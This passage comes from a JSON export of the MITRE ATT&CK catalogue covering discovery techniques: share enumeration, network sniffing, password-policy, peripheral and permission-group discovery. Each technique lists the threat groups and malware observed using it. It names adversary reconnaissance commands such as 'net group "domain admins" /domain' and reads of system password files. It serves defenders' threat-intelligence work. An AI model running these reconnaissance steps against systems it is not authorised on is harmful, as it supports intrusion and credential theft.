directories on various systems across a network.\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the net view \\\\remotesystem command. It can also be used to query shared drives on the local system using net share. For macOS, the sharing -l command lists all shared points used for smb services.", "id": "T1135", "examples": [{"id": "S1129", "name": "Akira", "description": "Akira can identify remote file shares for encryption."}, {"id": "G0006", "name": "APT1", "description": "APT1 listed connected network shares."}, {"id": "G0050", "name": "APT32", "description": "APT32 used the net view command to show all shares available, including the administrative shares such as C$ and ADMIN$."}, {"id": "G0082", "name": "APT38", "description": "APT38 has enumerated network shares on a compromised host."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used the post exploitation tool CrackMapExec to enumerate network shares."}, {"id": "G0096", "name": "APT41", "description": "APT41 used the net share command as part of network reconnaissance."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has enumerated shared folders and mapped volumes."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has enumerated shared drives on a compromised network."}, {"id": "S0638", "name": "Babuk", "description": "Babuk has the ability to enumerate network shares."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit enumerates open SMB shares on internal victim networks."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can check a user's access to the C$ share on a compromised machine."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can enumerate shared drives on the domain."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can search for network shares on the domain or workgroup using net view ."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability to discover network shares on compromised networks."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors executed the PowerView ShareFinder module to identify open shares."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used net share and net view to identify network shares of interest."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to enumerate network shares."}, {"id": "S0611", "name": "Clop", "description": "Clop can enumerate network shares."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can query shared drives on the local system."}, {"id": "S0575", "name": "Conti", "description": "Conti can enumerate remote open SMB network shares using NetShareEnum()."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can enumerate the shared folders and associated permissions for a targeted network."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can discover shared resources using the NetShareEnum API call."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya scanned the network for public shared folders."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM has the ability to use loop operations to enumerate network resources."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has a ENMDSKS command to enumerates available network shares."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can identify and enumerate victim system network shares."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has enumerated non-hidden network shares using WNetEnumResourceW. "}, {"id": "S0363", "name": "Empire", "description": "Empire can find shared drives on the local system."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has executed net view commands for enumeration of open shares on compromised machines."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS can enumerate network shares and mounted drives on a network."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to execute net view to discover mapped network shares."}, {"id": "S0617", "name": "HELLOKITTY", "description": "HELLOKITTY has the ability to enumerate network resources."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used the net view /all command to show available shares."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used Internet Explorer to view folders on other systems."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware has the ability to check for shared network drives to encrypt."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can gather network share information."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can scan local network for open SMB."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can use netstat and Net to discover network shares."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of network shares with the command net share."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can run C:\\Windows\\System32\\cmd.exe /c net view /all to discover network shares."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can identify shared resources in compromised environments."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to retrieve information about shares on remote hosts."}, {"id": "S0039", "name": "Net", "description": "The net view \\remotesystem and net share commands in Net can be used to find shared drives and directories on remote and local systems respectively."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net share command as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors discovered network disks mounted to the system using netstat."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo discovers shares on the network"}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module to enumerate network shares."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can list local and remote shared drives and folders over SMB."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use net share to identify network shares for use in lateral movement."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can identify and search networked drives for specific file name extensions."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can scan for network drives which may contain documents for collection."}, {"id": "S1073", "name": "Royal", "description": "Royal can enumerate the shared resources of a given IP addresses using the API call NetShareEnum."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to execute the net view command."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can enumerate connected drives for infected host machines."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can enumerate shares on a compromised host."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug listed remote shared drives that were accessible from a victim."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet enumerates the directories of a network resource."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used tools such as NBTscan to enumerate network shares."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper used netview to scan target systems for shared resources."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can identify network adjacent and accessible drives."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can enumerate connected remote logical drives."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the \"net view\" command to locate mapped network shares."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy identifies network drives when they are added to victim systems."}], "sub_techniques": []}, {"name": "Network Sniffing", "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.", "detailed_description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities. Adversaries may likely also utilize network sniffing during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.\nOn network devices, adversaries may perform network captures using Network Device CLI commands such as monitor capture.", "id": "T1040", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy\u2019s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid\u2019s industrial control systems. "}, {"id": "G0007", "name": "APT28", "description": "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used SniffPass to collect credentials by sniffing network traffic."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used network sniffing to obtain login data. "}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed to hook network APIs to monitor network traffic. "}, {"id": "S0363", "name": "Empire", "description": "Empire can be used to conduct packet captures on target hosts."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor."}, {"id": "S0357", "name": "Impacket", "description": "Impacket can be used to sniff network traffic via an interface or raw socket."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols."}, {"id": "S0443", "name": "MESSAGETAP", "description": "MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  "}, {"id": "S0590", "name": "NBTscan", "description": "NBTscan can dump and print whole packet content."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can sniff network traffic to look for packets matching specific conditions."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains a module for taking packet captures on compromised hosts."}, {"id": "S0019", "name": "Regin", "description": "Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB."}, {"id": "S0174", "name": "Responder", "description": "Responder captures hashes and credentials that are sent to the system after the name services have been poisoned."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used intercepter-NG to sniff passwords in network traffic."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem hooked the Catalina application filter chain doFilter on compromised systems to monitor all inbound requests to the local Tomcat web server, inspecting them for parameters like passwords and follow-on Java modules."}], "sub_techniques": []}, {"name": "Password Policy Discovery", "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).", "detailed_description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies  . Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. show aaa, show aaa common-criteria policy all).\nPassword policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS .", "id": "T1201", "examples": [{"id": "S0521", "name": "BloodHound", "description": "BloodHound can collect password policy information on the target environment."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used the NtdsAudit utility to collect information related to accounts and passwords."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can discover the password policies applied to the target system."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects password policy information with the command net accounts."}, {"id": "S0039", "name": "Net", "description": "The net accounts and net accounts /domain commands with Net can be used to obtain password policy information."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net accounts command as part of their advanced reconnaissance."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Get-PassPol to enumerate the domain password policy."}, {"id": "G0010", "name": "Turla", "description": "Turla has used net accounts and net accounts /domain to acquire password policy information."}], "sub_techniques": []}, {"name": "Peripheral Device Discovery", "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.", "detailed_description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.", "id": "T1120", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can list connected devices."}, {"id": "G0007", "name": "APT28", "description": "APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim."}, {"id": "G0067", "name": "APT37", "description": "APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. "}, {"id": "S0438", "name": "Attor", "description": "Attor has a plugin that collects information about inserted storage devices, modems, and phone devices."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can detect USB devices."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy can gather very specific information about attached USB devices, to include device instance ID and drive geometry."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to steal information about printers and the documents sent to printers."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can monitor for removable drives."}, {"id": "S0115", "name": "Crimson", "description": "Crimson has the ability to discover pluggable/removable drives to extract files from."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can monitor for removable drives being plugged into the compromised machine."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can list signed PnP drivers for smartcard readers."}, {"id": "S0062", "name": "DustySky", "description": "DustySky can detect connected USB devices."}, {"id": "G0020", "name": "Equation", "description": "Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can run GET.WORKSPACE in Microsoft Excel to check if a mouse is present."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy will attempt to detect if a usable smart card is current inserted into a card reader."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream FilepakMonitor component can detect removable drive insertion."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can identify removable media attached to victim's machines."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can identify external USB and hard drives for encryption and printers to print ransom notes."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can map UPnP ports."}, {"id": "S0409", "name": "Machete", "description": "Machete detects the insertion of new devices by listening for the WM_DEVICECHANGE window message."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can identify removable media attached to compromised hosts."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind obtains the number of removable drives from the victim."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has the ability to monitor removable drives."}, {"id": "S0385", "name": "njRAT", "description": "njRAT will attempt to detect if the victim system has a camera during the initial infection. njRAT can also detect any removable drives connected to the system."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can discover pluggable/removable drives to extract files from."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used tools to identify if a mouse is connected to a targeted system."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the fsutil fsinfo drives command as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors discovered removable disks attached to a system."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects information on available printers and disk drives."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can identify peripheral devices on targeted systems."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can identify and search removable drives for specific file name extensions."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker may attempt to connect to removable drives and mapped network drives."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can scan for removable media which may contain documents for collection."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can identify removable drives attached to the victim's machine."}, {"id": "S0148", "name": "RTM", "description": "RTM can obtain a list of smart card readers attached to the victim."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco has dropped a plugin to monitor external drives to C:\\Users\\Public\\It3.exe."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet enumerates removable drives for infection."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can check for the number of devices plugged into an infected host."}, {"id": "S0098", "name": "T9000", "description": "T9000 searches through connected drives for removable storage devices."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to identify connected Apple devices."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for attached VGA devices using lspci."}, {"id": "S0647", "name": "Turian", "description": "Turian can scan for removable media to collect data."}, {"id": "G0010", "name": "Turla", "description": "Turla has used fsutil fsinfo drives to list connected drives."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can check for connected USB devices."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has obtained victim's screen dimension and display device information."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can enumerate removable drives prior to the encryption process."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy enumerates information about connected storage devices."}], "sub_techniques": []}, {"name": "Permission Groups Discovery", "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.", "detailed_description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.", "id": "T1069", "examples": [{"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can enumerate the permissions associated with Windows groups."}, {"id": "G0096", "name": "APT41", "description": "APT41 used net group commands to enumerate various Windows user groups and permissions."}, {"id": "S0335", "name": "Carbon", "description": "Carbon uses the net group command."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has enumerated all users and roles from a victim's main treasury system."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has the ability to identify Workgroup membership."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to retrieve information about groups."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter gathered the local privileges for the infected host."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape checks for Kubernetes node permissions."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used the Get-ManagementRoleAssignment PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run net group /domain."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can identify the groups the user on a compromised host belongs to."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for group and user discovery."}], "sub_techniques": [{"name": "Local Groups", "description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.", "detailed_description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nCommands such as net localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.", "id": "T1069.001", "examples": [{"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: net localgroup administrator >> %temp%\\download"}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can collect information about local groups and members."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used the command net localgroup \"adminstrator\" to identify accounts with local administrator rights."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can obtain a list of local groups of users from a system."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used net localgroup administrators to identify  accounts with local administrative rights."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use net localgroup to list local groups on a system."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to execute the command net localgroup administrators."}, {"id": "S0091", "name": "Epic", "description": "Epic gathers information on local group names."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to execute the net localgroup administrators command on a targeted system."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy enumerates the privilege level of the victim during the initial infection."}, {"id": "S0170", "name": "Helminth", "description": "Helminth has checked the local administrators group."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has run net localgroup to enumerate local groups."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can obtain the permissions of the victim user."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar gathers information about local groups and members."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of users belonging to the local users and administrators groups with the commands net localgroup administrators and net localgroup users."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can discover local group memberships."}, {"id": "S0039", "name": "Net", "description": "Commands such as net group and net localgroup can be used in Net to gather information about and manipulate groups."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used net localgroup administrators to find local administrators on compromised systems."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net group command as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used the command net localgroup administrators to list all administrators part of a local group."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo has enumerated the local administrators group."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains modules, such as Get-LocAdm for enumerating permission groups."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect local group information by running net localgroup administrators or a series of other commands on a victim."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use net localgroup to enable discovery of local groups."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can obtain a list of local groups and members."}, {"id": "S0060", "name": "Sys10", "description": "Sys10 collects the group name of the logged-in user and sends it to the C2."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used the ShowLocalGroupDetails command to identify administrator, user, and guest accounts on a compromised host."}, {"id": "G0010", "name": "Turla", "description": "Turla has used net localgroup and net localgroup Administrators to enumerate group information, including members of the local administrators group."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has run net localgroup administrators in compromised environments to enumerate accounts."}]}, {"name": "Domain Groups", "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.", "detailed_description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\nCommands such as net group /domain of the Net utility,  dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups.", "id": "T1069.002", "examples": [{"id": "S0552", "name": "AdFind", "description": "AdFind can enumerate domain groups."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use net.exe group \"domain admins\" /domain to identify Domain Administrators."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can determine if a user on a compromised host has domain admin privileges."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can collect information about domain groups and members."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use net group for discovery on targeted domains."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors use the command net group \"domain admins\" /dom to enumerate domain groups."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can identify targets by querying account groups on a domain contoller."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can gather the user accounts within domain groups."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used batch scripts to enumerate administrators and users in the domain."}, {"id": "S0105", "name": "dsquery", "description": "dsquery can be used to gather information on permission groups within a domain."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can conduct Active Directory reconnaissance using tools such as Sharphound or AdFind."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used the command net group \"domain admins\" /domain to enumerate domain groups."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can determine if a targeted system is part of an Active Directory domain by  expanding the %USERDNSDOMAIN%  environment variable."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used a reconnaissance module that can be used to retrieve Windows domain membership information."}, {"id": "S0170", "name": "Helminth", "description": "Helminth has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has enumerated domain groups on targeted hosts."}, {"id": "G0100", "name": "Inception", "description": "Inception has used specific malware modules to gather domain membership."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs discovery of permission groups net group /domain."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of domain groups with the command net localgroup /domain."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used the AD Explorer tool to enumerate groups on a victim's network."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can identify domain groups through cmd.exe /c net group \"Domain Admins\" /domain."}, {"id": "S0039", "name": "Net", "description": "Commands such as net group /domain can be used in Net to gather information about and manipulate groups."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used net group /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to find domain group permission settings."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo specifically looks for Domain Admins and power users within the domain."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect domain group information by running net group /domain or a series of other commands on a victim."}, {"id": "S0496", "name": "REvil", "description": "REvil can identify the domain membership of a compromised host."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use System.DirectoryServices namespace to retrieve domain group information."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used AdFind to enumerate domain groups."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can enumerate domain groups by executing net.exe group /domain."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has executed net group \"domain admins\" /dom for discovery on compromised machines."}, {"id": "G0010", "name": "Turla", "description": "Turla has used net group \"Domain Admins\" /domain to identify domain administrators."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has run net group in compromised environments to discover domain groups."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can identify domain group membership for the current user."}]}, {"name": "Cloud Groups", "description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.", "detailed_description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\nWith authenticated access there are several tools that can be used to find permissions groups. The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command az ad user get-member-groups will list groups associated to a user account for Azure while the API endpoint GET https://cloudidentity.googleapis.com/v1/groups lists group resources available to a user for Google. In AWS, the commands ListRolePolicies and ListAttachedRolePolicies allow users to enumerate the policies attached to a role.\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS GetBucketAcl API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.", "id": "T1069.003", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can enumerate Azure AD groups."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate IAM permissions."}, {"id": "S0684", "name": "ROADTools", "description": 